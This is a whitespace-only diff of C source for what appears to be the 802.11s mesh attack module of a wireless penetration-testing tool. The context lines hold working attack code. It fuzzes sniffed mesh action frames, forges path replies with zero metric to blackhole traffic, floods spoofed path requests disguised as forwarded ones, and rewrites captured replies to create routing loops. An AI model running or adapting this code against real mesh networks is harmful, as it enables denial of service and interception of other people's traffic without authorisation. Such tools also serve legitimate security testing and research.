@@ -65,12 +65,12 @@ void ieee80211s_longhelp()
 void *ieee80211s_parse(int argc, char *argv[]) {
   int opt, i;
   struct ieee80211s_options *dopt = malloc(sizeof(struct ieee80211s_options));
-  
+
   dopt->mesh_id = NULL;
   dopt->attack_type = 0x00;
   dopt->speed = 100;
   dopt->target = NULL;
-  
+
   while ((opt = getopt(argc, argv, "n:f:s:b:p:l")) != -1) {
     switch (opt) {
       case 'f':
@@ -116,18 +116,18 @@ void *ieee80211s_parse(int argc, char *argv[]) {
 	return NULL;
     }
   }
-  
+
   if (dopt->attack_type == 0x00) {
     ieee80211s_longhelp();
     printf("\n\nERROR: You must specify an attack type (ie. -f)!\n");
     return NULL;
-  } 
+  }
   if ((dopt->mesh_id == NULL) && (dopt->attack_type == 'f')){
     ieee80211s_longhelp();
     printf("\n\nERROR: You must specify a Mesh ID for this attack!\n");
     return NULL;
-  } 
-  
+  }
+
   return (void *) dopt;
 }
 
@@ -155,7 +155,7 @@ void action_frame_sniffer_thread(void *target_id) {
   struct ieee_hdr *hdr;
   struct action_fixed *act;
   char *meshid;
-  
+
   while(1) {
     sniffed = osdep_read_packet();
     hdr = (struct ieee_hdr *) sniffed.data;
@@ -185,19 +185,19 @@ struct packet do_fuzzing(struct ieee80211s_options *dopt) {
   static struct ether_addr genmac;
   static unsigned int genmac_uses = 0;
   unsigned int curfuzz, i, j;
-  
+
   if (! (genmac_uses % 10)) { //New MAC every 10 packets
     genmac = generate_mac(MAC_KIND_CLIENT);
     genmac_uses = 0;
   }
   genmac_uses++;
-  
+
   if (sniffer == NULL) {
     sniffer = malloc(sizeof(pthread_t));
     action_frame_sniffer_pkt.len = 0;
     pthread_create(sniffer, NULL, (void *) action_frame_sniffer_thread, (void *) dopt->mesh_id);
   }
-  
+
   pthread_mutex_lock(&sniff_packet_mutex);
   while(action_frame_sniffer_pkt.len == 0) {
     pthread_mutex_unlock(&sniff_packet_mutex);
@@ -206,13 +206,13 @@ struct packet do_fuzzing(struct ieee80211s_options *dopt) {
   }
   sniff = action_frame_sniffer_pkt;
   pthread_mutex_unlock(&sniff_packet_mutex);
-  
+
   if (dopt->fuzz_type == 5) {
     curfuzz = (random() % 4) + 1;
   } else {
     curfuzz = dopt->fuzz_type;
   }
-  
+
   switch (curfuzz) {
     case 1:
       increase_seqno(&sniff);
@@ -237,7 +237,7 @@ struct packet do_fuzzing(struct ieee80211s_options *dopt) {
     default:
       printf("BUG! Unknown fuzzing type %c\n", dopt->fuzz_type);
   }
-  
+
   sniff.len = 0;
   return sniff;
 }
@@ -249,7 +249,7 @@ struct packet do_blackhole(struct ieee80211s_options *dopt) {
   struct mesh_preq *preq = NULL;
   struct mesh_prep *prep;
   struct ether_addr *src;
-  
+
   while(1) {
     sniff = osdep_read_packet();
     hdr = (struct ieee_hdr *) sniff.data;
@@ -261,12 +261,12 @@ struct packet do_blackhole(struct ieee80211s_options *dopt) {
       }
     }
   }
-  
+
   MAC_COPY(info_dst, preq->target);
   MAC_COPY(info_src, preq->originator);
   snprintf(blackhole_info, 1024, "Hops %3d  TTL %3d  ID %3d  Metric %5d  SeqNo %d/%d",
 	   preq->hop_count, preq->ttl, preq->discovery_id, preq->metric, preq->orig_seq, preq->target_seq);
-  
+
   src = get_source(&sniff);
   create_ieee_hdr(&inject, IEEE80211_TYPE_ACTION, 'a', AUTH_DEFAULT_DURATION, *src, *(dopt->target), *(dopt->target), *src, 0);
   actinj = (struct action_fixed *) (inject.data + sizeof(struct ieee_hdr));
@@ -275,7 +275,7 @@ struct packet do_blackhole(struct ieee80211s_options *dopt) {
   actinj->action_code = MESH_ACTION_PATHSEL;
   actinj->tag = MESH_TAG_PREP;
   actinj->taglen = 31;
-  
+
   prep = (struct mesh_prep *) (inject.data + sizeof(struct ieee_hdr) + sizeof(struct action_fixed));
   inject.len += sizeof(struct mesh_prep);
   prep->flags = 0x00;
@@ -287,7 +287,7 @@ struct packet do_blackhole(struct ieee80211s_options *dopt) {
   prep->metric = 0; /*ARRRRR!*/
   prep->originator = preq->target;
   prep->orig_seq = preq->target_seq + 10;
-  
+
   return inject;
 }
 
@@ -300,9 +300,9 @@ struct packet do_flood(struct ieee80211s_options *dopt) {
   static uint32_t seq = 0;
   uint8_t hops;
   uint32_t tseq;
-  
+
   MAC_SET_BCAST(bcast);
-  
+
   create_ieee_hdr(&inject, IEEE80211_TYPE_ACTION, 'a', AUTH_DEFAULT_DURATION, bcast, *(dopt->target), *(dopt->target), bcast, 0);
 
   act = (struct action_fixed *) (inject.data + sizeof(struct ieee_hdr));
@@ -311,13 +311,13 @@ struct packet do_flood(struct ieee80211s_options *dopt) {
   act->action_code = MESH_ACTION_PATHSEL;
   act->tag = MESH_TAG_PREQ;
   act->taglen = 37;
-  
+
   //Setting up values
   hops = (random() % 10) + 1; //Plus one so it looks like we just forwarded it ;)
   id++;
   seq += (random() % 10); //Randomly increasing sequence counter
   tseq = seq + ((random() % 50) - 25); //Setting target seq somewhere near orig seq
-  
+
   preq = (struct mesh_preq *) (inject.data + sizeof(struct ieee_hdr) + sizeof(struct action_fixed));
   inject.len += sizeof(struct mesh_preq);
   preq->flags = 0x00;
@@ -332,7 +332,7 @@ struct packet do_flood(struct ieee80211s_options *dopt) {
   preq->target_flags = 0x02; //wireshark said so
   preq->target = generate_mac(MAC_KIND_CLIENT);
   preq->target_seq = tseq;
-  
+
   return inject;
 }
 
@@ -342,7 +342,7 @@ struct packet create_loop(struct ieee80211s_options *dopt) {
   struct ieee_hdr *hdr;
   struct action_fixed *act;
   struct mesh_prep *prep;
-  
+
   while(1) {
     sniff = osdep_read_packet();
     hdr = (struct ieee_hdr *) sniff.data;
@@ -361,24 +361,24 @@ struct packet create_loop(struct ieee80211s_options *dopt) {
   hdr->addr3 = hdr->addr1; //dst to bssid
   hdr->addr1 = hdr->addr2; //src to dst
   hdr->addr2 = hdr->addr3; //bssid to src
-  
+
   MAC_COPY(info_dst, prep->target);
   MAC_COPY(info_src, prep->originator);
-  
+
   //Fix values to make injected packet be newer and better than old route
   prep->hop_count = 1;
   prep->ttl = 30;
   prep->metric = 1;
-  
+
   return sniff;
 }
 
 struct packet ieee80211s_getpacket(void *options) {
   struct ieee80211s_options *dopt = (struct ieee80211s_options *) options;
   struct packet pkt;
-  
+
   sleep_till_next_packet(dopt->speed);
-  
+
   switch (dopt->attack_type) {
     case 'f':
       pkt = do_fuzzing(dopt);
@@ -402,7 +402,7 @@ struct packet ieee80211s_getpacket(void *options) {
 
 void ieee80211s_stats(void *options) {
   struct ieee80211s_options *dopt = (struct ieee80211s_options *) options;
-  
+
   switch (dopt->attack_type) {
     case 'f':
       printf("\rReceived Action frames: %5d  Received Mesh Beacons:  %5d                    \n", incoming_action, incoming_beacon);
@@ -437,6 +437,6 @@ struct attacks load_ieee80211s() {
   this_attack.perform_check = (fps) ieee80211s_check;
   this_attack.get_packet = (fpp) ieee80211s_getpacket;
   this_attack.print_stats = (fps)ieee80211s_stats;
-  
+
   return this_attack;
 }
